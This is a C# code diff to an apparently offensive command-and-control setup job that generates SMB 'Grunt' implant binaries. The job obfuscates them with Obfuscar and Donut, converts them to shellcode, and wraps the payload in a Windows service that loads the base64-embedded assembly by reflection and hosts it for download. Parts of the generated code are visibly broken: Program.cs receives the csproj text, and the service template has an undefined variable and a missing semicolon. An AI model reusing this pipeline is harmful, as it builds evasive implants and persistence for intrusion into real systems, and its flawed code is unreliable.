@@ -26,6 +26,8 @@ namespace Scorpion.Jobs
   public class SetupJob : Job
   {
     public int DefaultTargetPort = 8080;
+    public string DefaultServiceNamespace = "GService";
+    public string DefaultServiceClassName = "GRunner";
 
     public string TargetDefaultHttpTemplate = "GruntHTTP";
     public string TargetDefaultSmbTemplate = "GruntSMB";
@@ -80,33 +82,42 @@ namespace Scorpion.Jobs
       for (int i = 0; i < smbGruntCount; i++) {
         var aGuid = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
 
-        await ProvisionSmbGrunt(listener, aGuid, dataDir, nugetExePath, donutExePath);
+        BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
+        var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
+        var smbBinPath = Path.Join(Path.Join(dataDir, aGuid), "Downloaded.exe");
+        Console.WriteLine("Saving Unobfuscated Grunt Binary");
+        File.WriteAllBytes(smbBinPath, rawSmbBin);
 
+        var obfuscatedBinPath = await ProvisionSmbBinaryGrunt(listener, smbLauncher, aGuid, dataDir, nugetExePath, donutExePath);
+        if (!String.IsNullOrEmpty(obfuscatedBinPath)) {
+          await ProvisionSmbBinaryServiceGrunt(listener, smbLauncher, aGuid, dataDir, obfuscatedBinPath);
+        }
       }
       return await Task.FromResult(0);
     }
 
-    public async Task<int> ProvisionSmbGrunt(HttpListener listener, string aGuid, string dataDir, string nugetExePath, string donutExePath)
+    public async Task<string> ProvisionSmbBinaryGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string nugetExePath, string donutExePath)
     {
       var request = new RequestBuilder(Api);
-
       var projDir = Path.Join(dataDir, aGuid);
 
       if (!Directory.Exists(projDir)) {
         Directory.CreateDirectory(projDir);
       }
-
       if (!Directory.Exists(Path.Join(projDir, "Properies"))) {
         Directory.CreateDirectory(Path.Join(projDir, "Properties"));
       }
-
       Console.WriteLine($"Generating csproj for {aGuid}");
-
-      var csproj = GenerateCsprojFile(aGuid, projDir);
+      var csproj = GenerateBinaryCsprojFile(aGuid, projDir);
       var csprojName = aGuid + ".csproj";
       var csprojPath = Path.Join(projDir, csprojName);
       Console.WriteLine($"Saving csproj for {aGuid}");
       File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));
+
+      var smbSrcPath = Path.Join(projDir, aGuid + ".cs");
+      Console.WriteLine("Saving SMB Grunt Stager Code");
+      File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
+      Console.WriteLine("Loading csproj for prgramatic build");
 
       Console.WriteLine($"Generating Obfuscar for {aGuid}");
       var obfuscar = GenerateObfuscarFile(aGuid, projDir);
@@ -114,16 +125,6 @@ namespace Scorpion.Jobs
       var obfuscarPath = Path.Join(projDir, obfuscarName);
       Console.WriteLine($"Saving Obfuscar for {aGuid}");
       File.WriteAllBytes(obfuscarPath, Encoding.ASCII.GetBytes(obfuscar));
-
-      BinaryLauncher smbLauncher = await GenerateBasicSmbGruntBinary(aGuid, listener);
-      var rawSmbBin = Convert.FromBase64String(smbLauncher.Base64ILByteString);
-      var smbBinPath = Path.Join(projDir, "Downloaded.exe");
-      Console.WriteLine("Saving Unobfuscated Grunt Binary");
-      File.WriteAllBytes(smbBinPath, rawSmbBin);
-      var smbSrcPath = Path.Join(projDir, aGuid + ".cs");
-      Console.WriteLine("Saving SMB Grunt Stager Code");
-      File.WriteAllBytes(smbSrcPath, Encoding.ASCII.GetBytes(smbLauncher.StagerCode));
-      Console.WriteLine("Loading csproj for prgramatic build");
 
       var assemblyInfo = GenerateAssemblyInfo(aGuid);
       var assemblyInfoName = "AssemblyInfo.cs";
@@ -162,7 +163,82 @@ namespace Scorpion.Jobs
           hostedShellcode.Content = Convert.ToBase64String(File.ReadAllBytes(shellcodePath));
           hostedShellcode = await request.CreateHostedFile((int)listener.Id, hostedShellcode);
 
+          // Service Versions
+
           Console.WriteLine($"Grunt generation complete for {aGuid}");
+          return obfuscatedBinPath;
+
+        } else {
+          Console.WriteLine($"Not able to find directory in C:\\Windows\\Microsoft.Net\\Framework that starts with 'v4.'. Can't find msbuild.exe");
+        }
+
+      } else {
+        Console.WriteLine("Not on windows. Skipping msbuild.");
+      }
+
+      return await Task.FromResult("");
+    }
+
+    public async Task<int> ProvisionSmbBinaryServiceGrunt(HttpListener listener, BinaryLauncher smbLauncher, string aGuid, string dataDir, string obfuscatedBinPath)
+    {
+      var request = new RequestBuilder(Api);
+      var svcGuid = aGuid + "svc";
+      var projDir = Path.Join(dataDir, svcGuid);
+
+      if (!Directory.Exists(projDir)) {
+        Directory.CreateDirectory(projDir);
+      }
+      if (!Directory.Exists(Path.Join(projDir, "Properies"))) {
+        Directory.CreateDirectory(Path.Join(projDir, "Properties"));
+      }
+
+      Console.WriteLine($"Generating csproj for {svcGuid}");
+      var csproj = GenerateServiceBinaryCsprojFile(svcGuid, projDir);
+      var csprojName = svcGuid + ".csproj";
+      var csprojPath = Path.Join(projDir, csprojName);
+      File.WriteAllBytes(csprojPath, Encoding.ASCII.GetBytes(csproj));
+
+      Console.WriteLine($"Generating program.cs for {svcGuid}");
+      var programCs = GenerateServiceProgramCsFile(svcGuid, projDir);
+      var programCsName = "Program.cs";
+      var programCsPath = Path.Join(projDir, programCsName);
+      File.WriteAllBytes(programCsPath, Encoding.ASCII.GetBytes(csproj));
+
+      Console.WriteLine($"Generating service runner {svcGuid}.cs for {svcGuid}");
+      var payload = Convert.ToBase64String(File.ReadAllBytes(obfuscatedBinPath));
+      var runnerCs = GenerateServiceRunnerCsFile(svcGuid, projDir, payload);
+      var runnerCsName = svcGuid + ".cs";
+      var runnerCsPath = Path.Join(projDir, runnerCsName);
+      File.WriteAllBytes(runnerCsPath, Encoding.ASCII.GetBytes(runnerCs));
+
+      Console.WriteLine($"Generating service runner {svcGuid}.Designer.cs for {svcGuid}");
+      var designerCs = GenerateServiceDesignerCsFile(svcGuid, projDir);
+      var designerCsName = svcGuid + ".Designer.cs";
+      var designerCsPath = Path.Join(projDir, designerCsName);
+      File.WriteAllBytes(designerCsPath, Encoding.ASCII.GetBytes(designerCs));
+
+      Console.WriteLine("Loading AssemblyInfo for prgramatic build");
+      var assemblyInfo = GenerateAssemblyInfo(svcGuid);
+      var assemblyInfoName = "AssemblyInfo.cs";
+      var assemblyInfoPath = Path.Join(Path.Join(projDir, "Properties"), assemblyInfoName);
+      Console.WriteLine($"Saving Assembly Info for {svcGuid}");
+      File.WriteAllBytes(assemblyInfoPath, Encoding.ASCII.GetBytes(assemblyInfo));
+
+      if (System.Runtime.InteropServices.RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
+
+        var msbuildPath = FindMsBuildExePath();
+        if (!String.IsNullOrEmpty(msbuildPath)) {
+
+          RunMsbuildForGrunt(svcGuid, projDir, msbuildPath, csprojName);
+
+          var hostedUrlPath = "/" + svcGuid + ".exe";
+          Console.WriteLine($"Hosting obfsucated service smb binary at path {hostedUrlPath}");
+          var hostedBin = new HostedFile();
+          hostedBin.ListenerId = listener.Id;
+          hostedBin.Path = hostedUrlPath;
+          hostedBin.Content = Convert.ToBase64String(File.ReadAllBytes(Path.Join(projDir, svcGuid + ".exe")));
+          hostedBin = await request.CreateHostedFile((int)listener.Id, hostedBin);
+          Console.WriteLine($"Grunt generation complete for {svcGuid}");
 
         } else {
           Console.WriteLine($"Not able to find directory in C:\\Windows\\Microsoft.Net\\Framework that starts with 'v4.'. Can't find msbuild.exe");
@@ -174,6 +250,8 @@ namespace Scorpion.Jobs
 
       return await Task.FromResult(0);
     }
+
+
     public string RunDonutForGrunt(string aGuid, string dataDir, string donutExePath)
     {
       var source = Path.Join(dataDir, aGuid + ".exe");
@@ -616,7 +694,7 @@ using System.Runtime.InteropServices;
 ", aGuid);
     }
 
-    public string GenerateCsprojFile(string aGuid, string projDir)
+    public string GenerateBinaryCsprojFile(string aGuid, string projDir)
     {
       var csproj = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
 <Project DefaultTarget=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
@@ -677,6 +755,174 @@ using System.Runtime.InteropServices;
     </PropertyGroup>
   </Target>
 </Project>", aGuid, projDir);
+      return csproj;
+    }
+
+    public string GenerateServiceRunnerCsFile(string aGuid, string projDir, string bin64)
+    {
+      var content = String.Format(@"
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Reflection;
+
+namespace {2}
+{
+    public partial class {3} : ServiceBase
+    {
+        public string TargetAssemblyName = ""{3}.{4}"";
+        public string TargetMethodName = ""Execute"";
+
+        public {3}()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            byte[]  data = System.Convert.FromBase64String(""{4}"")
+            Assembly a = Assembly.Load(myapp);
+            Type myType = a.GetType(TargetAssemblyName);
+            MethodInfo myMethod = myType.GetMethod(TargetMethodName);
+            object obj = Activator.CreateInstance(myType);
+            myMethod.Invoke(obj, null);
+        }
+
+        protected override void OnStop()
+        {
+        }
+    }
+}
+", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName, bin64);
+      return content;
+    }
+
+    public string GenerateServiceDesignerCsFile(string aGuid, string projDir)
+    {
+      var content = String.Format(@"
+namespace {2}
+{
+    partial class {3}
+    {
+        private System.ComponentModel.IContainer components = null;
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Component Designer generated code
+
+        private void InitializeComponent()
+        {
+            components = new System.ComponentModel.Container();
+            this.ServiceName = ""{0}"";
+        }
+
+        #endregion
+    }
+}
+", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName);
+      return content;
+    }
+    public string GenerateServiceProgramCsFile(string aGuid, string projDir)
+    {
+      var content = String.Format(@"
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+
+namespace {2}
+{
+    static class Program
+    {
+        static void Main()
+        {
+            ServiceBase[] ServicesToRun;
+            ServicesToRun = new ServiceBase[]
+            {
+                new {3}()
+            };
+            ServiceBase.Run(ServicesToRun);
+        }
+    }
+}
+", aGuid, projDir, DefaultServiceNamespace, DefaultServiceClassName);
+      return content;
+    }
+
+    public string GenerateServiceBinaryCsprojFile(string aGuid, string projDir)
+    {
+      var csproj = String.Format(@"<?xml version=""1.0"" encoding=""utf-8""?>
+<?xml version=""1.0"" encoding=""utf-8""?>
+<Project DefaultTarget=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">
+  <Import Project=""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"" Condition=""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"" />
+  <Target Name=""Build"">
+    <Csc Sources=""@(Compile)"" OutputAssembly=""$(OutputPath)\{0}.exe"" />
+  </Target>  
+  <PropertyGroup>
+    <Configuration Condition="" '$(Configuration)' == '' "">Debug</Configuration>
+    <Platform Condition="" '$(Platform)' == '' "">AnyCPU</Platform>
+    <ProjectGuid>{93148C2A-579A-4F48-AB25-16AD4B39D841}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>{2}</RootNamespace>
+    <AssemblyName>{0}</AssemblyName>
+    <TargetName>{0}</TargetName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <Deterministic>true</Deterministic>
+  </PropertyGroup>
+  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>{1}</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <PropertyGroup Condition="" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "">
+    <PlatformTarget>x64</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+   <OutputPath>{1}</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include=""System"" />
+    <Reference Include=""System.Core"" />
+    <Reference Include=""System.Xml.Linq"" />
+    <Reference Include=""System.Data.DataSetExtensions"" />
+    <Reference Include=""Microsoft.CSharp"" />
+    <Reference Include=""System.Data"" />
+    <Reference Include=""System.ServiceProcess"" />
+    <Reference Include=""System.Xml"" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include=""{0}.cs"">
+      <SubType>Component</SubType>
+    </Compile>
+    <Compile Include=""{0}.Designer.cs"">
+      <DependentUpon>{0}.cs</DependentUpon>
+    </Compile>
+    <Compile Include=""Program.cs"" />
+    <Compile Include=""Properties\AssemblyInfo.cs"" />
+  </ItemGroup>
+  <Import Project=""$(MSBuildToolsPath)\Microsoft.CSharp.targets"" />
+</Project>", aGuid, projDir, DefaultServiceNamespace);
       return csproj;
     }
     public int WaitForAvailable(string file, int limit = 10)
